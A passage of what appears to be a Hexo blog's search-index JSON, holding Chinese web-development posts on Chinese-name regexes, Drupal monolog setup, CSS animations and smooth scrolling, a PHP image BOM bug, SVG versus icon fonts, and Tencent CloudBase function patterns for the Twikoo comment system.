代表第一个汉字“一”；\\u9fa5 代表最后一个汉字“龥”；[\\u4e00-\\u9fa5] 匹配一个中文字符；{1,10} 这个中文字符出现 1 到 10 次；$ 匹配结尾。 测试一下—— Javascript12345const CHINESE_NAME_PATTERN = /^([\\u4e00-\\u9fa5]{1,10})$/;console.log(CHINESE_NAME_PATTERN.test('张三')); // trueconsole.log(CHINESE_NAME_PATTERN.test('iMaeGoo')); // falseconsole.log(CHINESE_NAME_PATTERN.test('张三1')); // falseconsole.log(CHINESE_NAME_PATTERN.test('1张三')); // false PHPPHP 中不认 \\u4e00，需要稍微变换一下语法—— PHP12345&lt;?phpecho preg_match('/^[\\x{4e00}-\\x{9fa5}]{1,10}$/u', '张三'); // 1echo preg_match('/^[\\x{4e00}-\\x{9fa5}]{1,10}$/u', 'iMaeGoo'); // 0echo preg_match('/^[\\x{4e00}-\\x{9fa5}]{1,10}$/u', '张三1'); // 0echo preg_match('/^[\\x{4e00}-\\x{9fa5}]{1,10}$/u', '1张三'); // 0 结尾的 u 是什么意思？官方文档 中有描述： u (PCRE_UTF8)此修正符打开一个与 perl 不兼容的附加功能。 模式和目标字符串都被认为是 utf-8 的。 无效的目标字符串会导致 preg_* 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误。 PHP 5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效（resp. PCRE 7.3 2007-08-28）。 以前就被认为是无效的 UTF-8。 MySQLSQL 中也无法直接写 Unicode 转义 \\u4e00，需要使用 HEX 将汉字转哈希之后，再匹配汉字的哈希值。 汉字的 HEX 范围：E4B880 ~ E9BEA5，所以可以用 e[4-9][0-9a-f]{4} 代表一个中文字符。 SQL123456SELECT HEX('一'); # 'E4B880'SELECT HEX('龥'); # 'E9BEA5'SELECT HEX('张三') REGEXP '^(e[4-9][0-9a-f]{4}){1,10}$'; # 1SELECT HEX('iMaeGoo') REGEXP '^(e[4-9][0-9a-f]{4}){1,10}$'; # 0SELECT HEX('张三1') REGEXP '^(e[4-9][0-9a-f]{4}){1,10}$'; # 0SELECT HEX('1张三') REGEXP '^(e[4-9][0-9a-f]{4}){1,10}$'; # 0 拓展细心的读者可能会发现，HEX 输出的是大写字母 E，为什么匹配的时候用的是小写字母 e？其实这也是 MySQL 正则与 JS 正则的不同之一。 SQL 中，REGEXP 是不区分大小写匹配，REGEXP BINARY 是区分大小写匹配。JS 中，/.../ 是区分大小写匹配，/.../i 是不区分大小写匹配。","link":"/2020/chinese-name-regexp/"},{"title":"屏蔽 Chrome for Windows “请停用以开发者模式运行的扩展程序” 提示","text":"开发过 Chrome 扩展的人都知道，加载已解压的扩展之后，Chrome 每次启动会弹窗警告，这个警告在新 Edge 中叫 “禁用开发人员模式扩展” 。 这个提示在打开浏览器几秒之后出现，并夺走窗口焦点，很是烦人，如何屏蔽呢？ 搜索之后，发现网友小茗同学给出了一个修改 dll 文件的方案，方案危险系数较高，并且会随着 Chrome 更新而失效，有没有更好的办法呢？ 我使用的火绒杀毒提供了一个弹窗拦截工具，很好地解决了这个问题。 打开火绒 - 安全工具 - 弹窗拦截 打开 Chrome 并等待警告出现 选择弹窗拦截中的截图拦截 选择 Chrome 上的警告窗口 选择 “关闭” 这样一来，警告没有消失，但每次都会被自动关闭，安全有效。 2020年3月24日更新谷歌访问助手项目的 Wiki 中介绍过如何将第三方插件加入白名单，这种方法解决了安装之后无法启用第三方插件的问题，但是，经测试仍然会有“请停用”警告弹窗，有兴趣研究的可以看看。https://github.com/haotian-wang/google-access-helper/wiki/Installation-Guide#%E6%96%B9%E6%B3%952%E7%9B%B4%E6%8E%A5%E5%AE%89%E8%A3%85crx%E6%96%87%E4%BB%B6","link":"/2020/chrome-disable-development-warning/"},{"title":"神奇的 @media (prefers-color-scheme: dark)","text":"夜间模式已经实现很久了，当初有人跟我讲，可以增加一个按时间切换的功能。 直到我在无意间查看 Reabble 阅读器的 CSS 样式时，发现了 @media (prefers-color-scheme: dark) 选择器。 来自：prefers-color-scheme - CSS（层叠样式表） | MDNprefers-color-scheme CSS 媒体特性用于检测用户是否有将系统的主题色设置为亮色或者暗色。 简而言之，就是可以实现随系统（或浏览器）的深、浅色模式设置，改变网页配色。 我觉得这是比按时间切换更好的一个实现，跟随系统设置比跟随时间更加人性化一些，毕竟还有我这种，白天开深色，晚上开浅色的异类（逃）","link":"/2020/css-prefers-color-scheme/"},{"title":"纯 CSS 实现椭圆轨迹旋转小球","text":"话不多说看效果 .frame { background-color: #EEEEEE; position: relative; width: 300px; height: 200px; } .ball { width: 100px; height: 100px; border-radius: 100%; position: absolute; animation: animX 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate, animY 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate, scale 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate; } .ball.one { background-color: #FFFFCC; animation-delay: -6s, -4.5s, -4.5s; } .ball.two { background-color: #CCFFFF; animation-delay: -4s, -2.5s, -2.5s; } .ball.three { background-color: #FFCCCC; animation-delay: -2s, -0.5s, -0.5s; } @keyframes animX { 0% { left: 0px; } 100% { left: 200px; } } @keyframes animY { 0% { top: 0px; } 100% { top: 100px; } } @keyframes scale { 0% { transform: scale(0.7); } 100% { transform: scale(1); } } 相关代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;div class=&quot;frame&quot;&gt; &lt;div class=&quot;ball one&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ball two&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ball three&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;style&gt;.frame { background-color: #EEEEEE; position: relative; width: 300px; height: 200px;}.ball { width: 100px; height: 100px; border-radius: 100%; position: absolute; animation: animX 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate, animY 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate, scale 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate;}.ball.one { background-color: #FFFFCC; animation-delay: -6s, -4.5s, -4.5s;}.ball.two { background-color: #CCFFFF; animation-delay: -4s, -2.5s, -2.5s;}.ball.three { background-color: #FFCCCC; animation-delay: -2s, -0.5s, -0.5s;}@keyframes animX { 0% { left: 0px; } 100% { left: 200px; }}@keyframes animY { 0% { top: 0px; } 100% { top: 100px; }}@keyframes scale { 0% { transform: scale(0.7); } 100% { transform: scale(1); }}&lt;/style&gt; 解析设置动画，分别控制小球 x 轴，y 轴，以及缩放比。先画张图，把小球 x 轴、y 轴的位置、缩放比与时间的关系用坐标系表示出来—— 通过这张画图可以看出—— 想顺时针，x 轴运动需要比 y 轴运动提前 1/4 个周期，逆时针则延后 1/4 个周期； 三个小球想均匀分布，需要两两错开 1/3 个周期； y 轴到达最高点时，球距离最远，y 轴到达最低点时，球距离最近，近大远小，y 轴位置和缩放比是正相关。 我们动画一个周期是 6 秒，理解了这些，就可以写出相应的 animation 出来了。 参考https://www.jb51.net/css/643232.html","link":"/2020/css-rotating-ball/"},{"title":"记录 Drupal 配置 monolog 遇到的坑","text":"在开发 Drupal CMS 网站时，我们发现 Drupal 默认的日志记录在 watchdog 数据表中，为了把日志记录在文件、控制台输出，可以使用 monolog 模块。这个模块提供的文档较少，在此记录一下遇到的问题。 TOC 启用模块报错 The service “monolog.handler.rotating_file” has a dependency on a non-existent parameter “monolog.level.debug”. 修改日志格式为 JSON 输出到控制台（在 Drupal 运行在 Docker 容器中时非常有用） arguments 的配置 processors 的配置 分离 INFO 和 ERROR 启用模块报错阅读模块的 README 之后，我按照 Quick start 一模一样地配置了相应的文件 You should create a site specific services.yml (monolog.services.yml for example) in the samefolder of your settings.php and then add this line to settings.php itself: settings.php1$settings['container_yamls'][] = 'sites/default/monolog.services.yml'; The simplest configuration that allows Monolog to log to a rotating file might be: monolog.services.yml1234567parameters: monolog.channel_handlers: default: ['rotating_file']services: monolog.handler.rotating_file: class: Monolog\\Handler\\RotatingFileHandler arguments: ['private://logs/debug.log', 10, '%monolog.level.debug%'] 解压模块到 drupal/modules/contrib/monolog，用 drush en monolog 命令启用，却遇到了报错。 1The service &quot;monolog.handler.rotating_file&quot; has a dependency on a non-existent parameter &quot;monolog.level.debug&quot;. 原因在于，”monolog.level.debug” 是在 monolog 的 monolog.services.yml 里面定义的，未开启 monolog 时，这个常量不存在，而这个常量不存在，setting.php 就会报错，setting.php 报错，就无法开启 monolog …… 这是一个死循环。 解决办法1：用 try 包裹 setting.php 中引入 monolog.services.yml 的行。 settings.php123try { $settings['container_yamls'][] = 'sites/default/monolog.services.yml';} catch (\\Exception $e) {} 解决办法2：在自己的 monolog.services.yml 中同样声明 monolog.level.debug。 monolog.services.yml12345678parameters: monolog.channel_handlers: default: ['rotating_file'] monolog.level.debug: '100'services: monolog.handler.rotating_file: class: Monolog\\Handler\\RotatingFileHandler arguments: ['private://logs/debug.log', 10, '%monolog.level.debug%'] 修改日志格式只需给 handler 配置 formatter monolog.services.yml12345parameters: monolog.channel_handlers: default: handlers: ['rotating_file'] formatter: 'json' 输出到控制台只需用 StreamHandler 输出到 php://stdout monolog.services.yml1234services: monolog.handler.std_info: class: Monolog\\Handler\\StreamHandler arguments: ['php://stdout', '%monolog.level.info%'] arguments 的配置看了前两个你也会发现，这里面的 arguments 是啥？只见其值不见其名，它是什么意思？ 我们可以理解 handler 控制日志输出的方式，不仅支持写到文件、控制台，甚至可以配置发送邮件，arguments 则是 handler 的参数。 关于有哪些 handler，可以到 02-handlers-formatters-processors 查看； 关于每一种 handler 需要怎么配置 arguments，可以到这个页面搜索 handler 的名字，看 __construct 前的注释。 processors 的配置processor 控制日志包含的内容，有哪些 processor 也需要在模块的代码里看。https://git.drupalcode.org/project/monolog/-/tree/8.x-1.x/src%2FLogger%2FProcessor 强烈吐槽：为什么我需要看代码来研究一个 “世界上最好的日志插件” 怎么用…… 分离 INFO 和 ERROR很多时候我们需要把不同级别的 LOG 打到不同的地方去，一开始我试着这样配 monolog.services.yml1234567services: monolog.handler.rotating_file_info: class: Monolog\\Handler\\RotatingFileHandler arguments: ['/var/log/drupal/info.log', 7, '%monolog.level.info%'] monolog.handler.rotating_file_error: class: Monolog\\Handler\\RotatingFileHandler arguments: ['/var/log/drupal/error.log', 7, '%monolog.level.error%'] 发现一个问题，info.log 不仅包含了 INFO，还包含了所有级别高于 INFO（如 WARN, ERROR）的日志，我不想把 ERROR 打在 info.log 里，怎么办？ 我先提交了一个 issue Is it possible to set maxium logging level? 后来经过 Will 巨佬指点，可以利用冒泡参数实现这样的需求。 StreamHandler.php123456789/** * @param resource|string $stream If a missing path can't be created, an UnexpectedValueException will be thrown on first write * @param string|int $level The minimum logging level at which this handler will be triggered * @param bool $bubble Whether the messages that are handled can bubble up the stack or not * @param int|null $filePermission Optional file permissions (default (0644) are only for owner read/write) * @param bool $useLocking Try to lock log file before doing any writes * * @throws \\InvalidArgumentException If stream is not a resource or string */ $bubble 默认为 TRUE。我们首先配置两个 handler，一个打 INFO，一个打 ERROR，然后将 ERROR handler 的 $bubble 设置为 FALSE，阻止其向上一个 INFO handler 冒泡，这样，当 INFO log 来时，不会走 ERROR handler，而经由 INFO handler 打出，当 ERROR log 来时，会先由 ERROR handler 打出，然后不会冒泡到 INFO handler，达到目的。像这样—— monolog.services.yml12345678910111213141516171819parameters: monolog.channel_handlers: default: # 注意：monolog 是【从后往前】处理 handlers 的 handlers: ['rotating_file_info', 'rotating_file_error'] formatter: 'json' # Enabled processors. monolog.processors: ['message_placeholder', 'current_user', 'request_uri', 'ip', 'referer', 'filter_backtrace', 'introspection'] # Logger levels. monolog.level.error: '400' monolog.level.info: '200'services: monolog.handler.rotating_file_info: class: Monolog\\Handler\\RotatingFileHandler arguments: ['/var/log/drupal/info.log', 7, '%monolog.level.info%'] monolog.handler.rotating_file_error: class: Monolog\\Handler\\RotatingFileHandler # 设置 $bubble = FALSE 阻止 ERROR 打进 INFO log arguments: ['/var/log/drupal/error.log', 7, '%monolog.level.error%', FALSE]","link":"/2020/drupal-monolog/"},{"title":"解决 Edge 浏览器 SCRIPT5022: Exception thrown and not caught","text":"JS 代码在 Safari, Chrome, Firefox 都是好的，就只有 Edge 莫名其妙地报错。 1SCRIPT5022: Exception thrown and not caught 未捕获的异常？EXM？你倒是说是什么异常啊？行号还是错的？点过去无法定位错误位置？hash-navigation.js？我的项目里根本都没有这个 js 啊喂！ 后来怎么解决的呢？因为这个错误是在滚轮滚动的时候打出来的，我在项目中各个 onScroll 方法外层加了 try catch 块。 12345try { // ...} catch (e) { console.log(e)} 于是真相水落石出了。 某处代码迭代了 DOM 元素，而在 Edge 中，document.getElementsByClassName 的返回不支持迭代，其他浏览器不存在这个问题。 1234const doms = document.getElementsByClassName('some-class')for (const dom of doms) { // Edge 会报错 // ...} 换一种兼容性更好的迭代方式就好了 12345const doms = document.getElementsByClassName('some-class')for (let i = 0; i &lt; doms.length; i++) { // Edge 不会报错了 const dom = doms[i] // ...} 如果你也遇到了这个异常，可以试试加 try catch 的办法，从而定位问题根源。","link":"/2020/edge-error/"},{"title":"PC 浏览器平滑惯性滚动（smooth scroll）一套简单实现","text":"前言主要是 Bing 找了许多 libraries。效果在 Chrome for Windows 上都不理想，要么滚动很生硬，要么就是太复杂，就自己实现了。 本来是 PC only 的，写好后测试了一下移动端，是兼容的，效果也还不错…… 不过反正移动端都自带惯性滑动了 效果 无惯性滚动 有惯性滚动 .ss-container { width: 100%; height: 500px; position: relative; overflow-y: auto; } .ss-container.smooth { overflow-y: hidden; } .ss-container-body { width: 100%; position: absolute; transition: transform 1s cubic-bezier(0.23, 1, 0.32, 1); } .ss-container-hitbox { width: 100%; height: 1500px; } .ss-box { width: 100%; height: 300px; } .smooth-scroll { position: -webkit-sticky; position: sticky; top: 0; width: 100%; } document.getElementById('smooth-scrollable').onscroll = (e) => { const target = e.currentTarget document.getElementById('smooth-target').style.transform = `translateY(-${target.scrollTop}px)` } 配色参考：https://color.adobe.com/zh/%E6%B5%81%E8%A1%8C%E8%89%B2-color-theme-4031536/ 代码HTML123456789101112131415161718192021222324252627&lt;div class=&quot;columns&quot; style=&quot;width: 100%;&quot;&gt; &lt;div class=&quot;column&quot;&gt; &lt;h3 id=&quot;无惯性滚动&quot;&gt;无惯性滚动&lt;/h2&gt; &lt;div class=&quot;ss-container&quot;&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #0067A6;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #00ABD8;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #008972;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #EFC028;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #F2572D;&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;column&quot;&gt; &lt;h3 id=&quot;有惯性滚动&quot;&gt;有惯性滚动&lt;/h3&gt; &lt;div class=&quot;ss-container&quot; id=&quot;smooth-scrollable&quot;&gt; &lt;div class=&quot;smooth-scroll&quot;&gt; &lt;div class=&quot;ss-container-body&quot; id=&quot;smooth-target&quot;&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #0067A6;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #00ABD8;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #008972;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #EFC028;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #F2572D;&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;ss-container-hitbox&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; CSS12345678910111213141516171819202122232425262728.ss-container { width: 100%; height: 500px; position: relative; overflow-y: auto;}.ss-container.smooth { overflow-y: hidden;}.ss-container-body { width: 100%; position: absolute; transition: transform 1s cubic-bezier(0.23, 1, 0.32, 1); /* 此处可以改变动画函数和持续时间 */}.ss-container-hitbox { width: 100%; height: 1500px; /* 高度等于滚动区域内的总高度，真实场景下可能需要动态计算 */}.ss-box { width: 100%; height: 300px;}.smooth-scroll { position: -webkit-sticky; position: sticky; top: 0; width: 100%;} Javascript1234document.getElementById('smooth-scrollable').onscroll = (e) =&gt; { const target = e.currentTarget document.getElementById('smooth-target').style.transform = `translateY(-${target.scrollTop}px)`} 解析 在滚动区域内增加一个 hitbox，高度等于滚动区域内的总高度，撑起滚动容器 设置滚动对象为 sticky 定位（如果滚动区域占满浏览器，也可用 fixed），并用 transform: translateY(); 控制其上下移动 监听滚动事件，并动态改变 translateY 的值 添加 CSS 动画效果 transition: transform 1s;，可以同时设置动画函数和持续时间 根据这个思路，可以封装一个 JS 库，但是我好懒……","link":"/2020/h5-smooth-scroll/"},{"title":"博客已启用 Twikoo 评论系统","text":"评论系统一直是静态网站的痛点。 Valine：安全性不高 Gitalk：需要评论者注册Github Disqus：需要注册，国内访问不畅 畅言：广告多，需要验证手机号 难道就没有一个完美的方案？ 在咕咕咕了近三个月后，我自己搞出了一套评论系统，并命名为 Twikoo。 成本上，腾讯云云开发环境可以免费搭建 安全性上，使用腾讯云云函数开发接口，不开放一丁点数据库权限，未来更新将接入 Akismet 反垃圾检查 易用性上，支持点赞、邮件通知、微信通知（限博主），未来会增加更多玩法 欢迎访问 twikoo.js.org 了解更多。 滚回去修 bug 了","link":"/2020/hello-twikoo/"},{"title":"hexo-theme-icarus 3 食用经验分享","text":"昨天晚上 Icarus 主题的 RC 版本发布，离正式版不远了，我自 3.0.0-beta.1 一路使用到现在，把自己的使用经验分享一下。 魔改迁移由于主题作者换掉了 ejs 语言，全部重写了一遍，迁移这块的难度是最大的。 拉 dev 分支，冲突实在是太多了，我的办法是，把在旧版上的魔改的整个 diff 导出，然后直接从 dev 签出一个新的分支，参考 diff 对每个文件都重新修改，花了不到2个小时搞定。 魔改 hexo-component-inferno 组件主题中部分可重用的 JS 和 JSX 代码已经被移到另一个项目 hexo-component-inferno 中，我们如何对这些组件魔改？此时要分2种情况—— widgets 的魔改 其它 JS 和 JSX 的魔改 对于已经移除代码的 widgets直接从 hexo-component-inferno / src / view 把需要修改的 JSX 复制到主题目录下的 layout/widget，再进行魔改即可。 例如：我需要修改 subscribe_email widget，在组件根 DOM 上加一个 id 以实现 live2d 交互，需要复制 hexo-component-inferno/src/view/widget/subscribe_email.jsx 到 themes/icarus/layout/widget/subscribe_email.jsx，再进行修改。 当然，如果你有自己写的 widget，也可以统统丢到 layout/widget 里去。 对于其它 JS 和 JSX 的魔改需要全局搜索引用处，修改引用路径为主题路径下改好的文件。 例如：我需要修改 paginator.jsx 以改变分页的 delta 值，可以复制 hexo-component-inferno/src/view/misc/paginator.jsx 到 themes/icarus/layout/misc/paginator.jsx，再进行魔改，修改完成后，需要全局搜索 hexo-component-inferno/lib/view/misc/paginator 并替换为 ./misc/paginator（注意，这里我写的是相对路径，请在替换后确认每处引用的相对路径正确）。 12- const Paginator = require('hexo-component-inferno/lib/view/misc/paginator');+ const Paginator = require('./misc/paginator'); 魔改 CSS不建议直接修改原来的 CSS 文件，而是覆盖样式，由于 3.0 中已经对 CSS 代码进行细分，建议把魔改的 CSS 也抽成单独的文件，方便管理。 1234567891011121314icarus └─source └─css │ cyberpunk.styl │ default.styl+ │ imaegoo.styl // 个人魔改+ │ night.styl // 夜间模式 │ style.styl └─live2d │ flat-ui-icons-regular.eot │ flat-ui-icons-regular.svg │ flat-ui-icons-regular.ttf │ flat-ui-icons-regular.woff │ waifu.css 自己建立的 styl 文件，需要在 style.styl 中引入。 style.styl12@import &quot;imaegoo&quot;@import &quot;night&quot; 代码压缩我曾经使用 gulp 来压缩 Hexo 生成的静态 HTML, CSS, JS 文件，但 3.0 对所有的 JS 使用了 ES6 重写，这造成了压缩插件不工作。 我尝试过把所有使用 ES6 语法的地方手工改回 ES5 语法，但最终放弃了，为什么要倒退呢？这反倒会增加未来升级的难度。 我放弃了对存在 ES6 的 JS 压缩，把它们全部丢进忽略列表吧！ gulpfile.js12345678910111213// 压缩 js 文件gulp.task('minify-js', function () { return gulp.src([ './public/**/*.js', '!./public/js/algolia.js', // ignore es6 js file '!./public/js/animation.js', // ignore es6 js file '!./public/js/back_to_top.js', // ignore es6 js file '!./public/js/insight.js', // ignore es6 js file '!./public/js/main.js' // ignore es6 js file ]) .pipe(uglify()) .pipe(gulp.dest('./public'));});","link":"/2020/icarus-3-guide/"},{"title":"Icarus 夜间模式支持 3.0 了","text":"原主题Icarus 夜间模式（实验中）如何给 Icarus 增加夜间模式 夜间模式单独提取的代码目前已经更新，支持 Icarus 3.0.0，有需要的朋友欢迎 checkout。 分支：https://github.com/imaegoo/hexo-theme-icarus/tree/night3提交：https://github.com/imaegoo/hexo-theme-icarus/commit/fc3d016ae1c999347bd9ecbf3cc656e1382db06d 1234cd theme/icarusgit remote add imaegoo https://github.com/imaegoo/hexo-theme-icarus.gitgit fetch imaegoogit merge imaegoo/night3","link":"/2020/icarus-night-mode-3/"},{"title":"PHP imagepng 输出损坏的图片问题解决","text":"问题发现我和同事的两套本地开发环境，相同的一段返回随机验证码图片的代码，验证码代码参考的是 php实现的Captcha验证码类实例 里的代码。在同事的电脑上调用，出来的是裂开的图片，在我的电脑上调用，出来的就是正常的图片，这是为什么呢？解决这个问题花费了三四个小时，记录一下过程。 解决过程因为代码上没有区别，所以开始怀疑环境问题，两台开发机都是相同型号，配置也相同，PHP 运行在 docker 容器下，检查 PHP 版本相同。 查了一下 PHP 文档，怀疑可能是因为什么特性没有启用，测试以下代码： test.php12345&lt;?phpif (imagetypes() &amp; IMG_PNG) { echo &quot;PNG Support is enabled&quot;;}?&gt; 测试结果 imagetypes() &amp; IMG_PNG 的值大于零，看起来两个环境都是支持 PNG 图的。 比较两台电脑生成的图片，首先用 Notepad++ 打开损坏的图片，发现文件头尾都是正常的。 为了减少干扰因素，我注释掉了随机生成验证码的部分，让两个环境都生成相同的空白图片，然后用 UltraEdit 或其他 16 进制文件编辑器打开。 这时候我才发现了区别，损坏图片开头多出了3个字节，EF BB BF，即我们常说的 UTF-8 BOM。 有了线索就上网查，查到了另一博客 东风无力百花残 的文章 PHP文件头BOM头问题 我刚因为一个愚蠢的问题而损失了大约4个小时。我在本地服务器上的图像以某种方式被损坏，因此没有显示在浏览器中。经过多次环顾和测试，包括多次在我的计算机上重新安装 apache，我将问题追溯到包含的文件。没有问题不是空白，而是 UTF BOM 编码字符在我的一个未被引用的文件的开头…所以，当心你的包含文件！确保它们未在 UTF 中编码，或者在没有物料清单的 UTF 中进行编码。希望它能省下别人的时间。 好的，感谢……等等，我们不太一样，我们用的是 Symfony HttpFoundation 模块做的 API，controller 也都是不包含 BOM 头的呀…… 我也不是很懂 PHP，继续查，又查到了一个 StackOverflow 上的问题 Symfony2 Remove UTF-8 BOM from controller responses 好的，感谢……等等，看回复，最后他是排除了这和 Symfony 的关系，并没有给出解决方案…… 这个文件头到底该怎么去掉啊…… 我在本地试着给 API 的入口点 index.php 文件改成了 UTF-8 With BOM 编码，保持之后，“成功” 把图片搞裂了。 激动地去找同事检查她的 index.php，咦，并没有 BOM。 线索断了…… 最后还是同事自己找到的解决方案，只要换一个思路，我们找不到 BOM 是在何处加上的，也无法保证部署后文件没有 BOM，那就在返回图片流之前，清空缓冲区。 CaptchaUtil.php1234ob_end_clean();ob_clean();...imagepng(...); 问题立即得到解决。 最后还是没想出来 BOM 在哪里出来的……","link":"/2020/php-gd-image-broken/"},{"title":"比较 SVG 与字体图标 - 缺点与解决方案","text":"如果要为网站增加矢量图标，其中两个选项是使用 SVG 和使用字体图标，两种方式各有千秋，以下是我个人做的比较。 SVG在阅读这一部分前，可以先参考文章 HTML中嵌入SVG图片的N种方式，了解一下不同的 SVG 嵌入页面的方式。 缺点 解决方案 如果将 SVG 放在静态资源目录，通过路径引用至页面，SVG 将造成额外的 HTTP 请求 在 HTML 中内嵌 &lt;svg&gt; 标签 如果在 HTML 中内嵌 &lt;svg&gt; 标签，HTML 会显得杂乱且无法复用 使用 SVG Inline Loader for Webpack 可以用 require 的方式向 HTML 插入 SVG 图标本身带的颜色（类似 fill=&quot;#ccc&quot;）无法覆盖 移除 SVG 本身的颜色。使用 SVG Inline Loader for Webpack 的 removingTagAttrs 选项，可以在打包时批量去除图标本身的颜色，再通过 CSS fill 覆盖颜色 字体图标 缺点 解决方案 因为字体图标本身是一个字符，所以会受到系统级反锯齿（如 ClearType 和 Retina）影响，导致本来锐利的小尺寸的图标边缘不锐利 使用 font-smooth 样式控制图标的反锯齿，在 Chrome 下测试没有成功，未找到更好的解决办法 当遇到网络较差，或者用户使用了屏蔽网页字体的插件时，图标会变成口口 在字体文件加载完成之前尝试隐藏所有图标 无法显示彩色图标 目前发现有网站是把彩色图标拆分成单色图标，再叠加显示，用 SVG 显然更方便 定位不准 这个大多数前端开发应该都有感触，典型就是复选框和文字标签对不齐，要检查图标的 CSS line-height，vertical-align，letter-spacing，word-spacing，display, 寻找对不齐的原因 维护（增加、删除图标）困难 使用阿里的 iconfont 服务来管理字体图标是很好的办法 对屏幕阅读器等辅助功能不友好 需要做适配，可以参考 Bulletproof Accessible Icon Fonts SVG 在线转 iconfont https://icomoon.io/app/ 感谢 Camille Wu 参考文章 Inline SVG vs Icon Fonts [CAGEMATCH] HTML中嵌入SVG图片的N种方式","link":"/2020/svg-vs-icon-font/"},{"title":"腾讯云云开发云函数 之 异步执行，提前返回","text":"云函数的特性是，当 main 函数 return 时，执行进程会被立即冻结。这一点在官方文档Node.js 8 的异步行为中有提到。 对于异步函数，主流程执行完成后，函数实例进程会被冻结，进程中的所有异步任务会暂停执行，直到这个进程被再次唤起。另一方面，如果函数实例进程由于某些原因没被复用（例如更新了函数代码），这个异步流程中的代码就永远不会被执行。 但是有些场景下，云函数需要很长的执行时间，例如，Twikoo 通过 Akismet 检测垃圾评论的过程。按照特性，在检测过程结束前，就不能异步检测，提前返回结果给前端，否则检测进程就会被冻结，导致检测失败。我们只能 await 同步检测，造成请求响应慢，用户体验差。 按照 Java 的习惯，我们会启动新的线程执行长时间的任务，在云函数中怎样实现？ 首先 node.js 想要实现多线程是不可能的，那我们换个思路，可以实现多进程吗？可以通过 “云函数调用云函数” 实现多个云函数进程并发执行吗？可以。 index.js123456789101112try { const isSpam = await app.callFunction({ name: 'twikoo', // 调起另一个云函数进程 data: { event: 'CHECK_SPAM', // 检查垃圾评论 comment // 传入检查的评论数据 } }, { timeout: 300 }) // 设置较短的 timeout 来实现异步 return isSpam.result.isSpam // 如果没有超时，可以直接拿到返回结果} catch (e) { console.log('开始异步检测垃圾评论') // 如果超时了，两个云函数进程也都会正常执行下去} callFunction 提供了请求超时时间的设置，即使请求超时，被调用的云函数也是会继续执行完的。那我们就利用这一点，设置较短的 timeout 来实现异步。这样，用户调起的云函数就能够迅速返回结果，垃圾评论检测就可以在另一个进程中慢慢执行了。 肯定有人会问，想要保护起来这种“异步云函数”，只能内部调用，不能外部调用，该怎么实现？这里也提供一个简单的方法。 index.js1234567891011exports.main = async (event, context) =&gt; { if (!isRecursion(context)) { return // 被外部调用，直接返回 }}// 判断是否为外部调用（即云函数调用云函数）function isRecursion (context) { const envObj = tcb.getCloudbaseContext(context) return envObj.TCB_SOURCE.substr(-3, 3) === 'scf'} 相关完整代码请查看 Twikoo 源码","link":"/2020/tcb-functions-async/"},{"title":"腾讯云云开发云函数 之 代码共用","text":"腾讯云云开发云函数的文档中写道—— 不同的云函数可以共用代码文件（目录）吗未上线 如果是简单的云函数，这一点还能接受，在开发 Twikoo 评论系统的过程中，云函数要实现的 API 越来越多，逐渐让我发现了它的弊端： 大量的代码复制！ 版本管理非常不便！ 依赖管理非常不便！ 一次要部署十来个云函数，很麻烦！ 每个云函数都有独立的冷启动时间，很慢！ 显然违反了开发的 DRY 原则，这迫使我开始思考解决方案。 正常的思维是，一个 API 写一个云函数，如果将云函数合并，用一个云函数实现不同的功能，能否解决这样的问题呢？ 可以！ 经过改造后的云函数，只保留了一个云函数入口点，通过传入 event，来调用不同的分功能，不同的功能也终于可以复用代码了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 云函数入口点 / entry pointexports.main = async (event, context) =&gt; { let res = {} await readConfig() try { switch (event.event) { case 'GET_FUNC_VERSION': res = getFuncVersion() break case 'COMMENT_GET': res = await commentGet(event) break case 'COMMENT_LIKE': res = await commentLike(event) break case 'COMMENT_SUBMIT': res = await commentSubmit(event) break case 'COUNTER_GET': res = await counterGet(event) break case 'GET_PASSWORD_STATUS': res = await getPasswordStatus() break case 'SET_PASSWORD': res = await setPassword(event.password) break case 'SET_CONFIG': res = await setConfig(event) break case 'LOGIN': res = await login(event.password) break default: res.code = RES_CODE.EVENT_NOT_EXIST res.message = '请更新 Twikoo 云函数至最新版本' } } catch (e) { console.error('Twikoo 遇到错误，请参考以下错误信息。如有疑问，请反馈至 https://github.com/imaegoo/twikoo/issues') console.error('请求参数：', event) console.error('错误信息：', e) res.code = RES_CODE.FAIL res.message = e.message } return res}","link":"/2020/tcb-functions-dry/"},{"title":"腾讯云云开发云函数 之 文件导入功能","text":"背景Twikoo 评论系统要实现导入功能，导入，就需要上传文件。 通过调用云函数，我们能够传递 string、number 等简单的参数，想要上传文件？不太行。 想到云开发环境有一块默认开通的 COS 空间，这块空间允许登录用户上传文件，只要利用这片空间，就可以实现将文件上传给云函数的功能了。 主要思路 前端调用 js-sdk 上传文件，获取到 fileID 前端将 fileID 作为参数，调用云函数 云函数通过 fileID 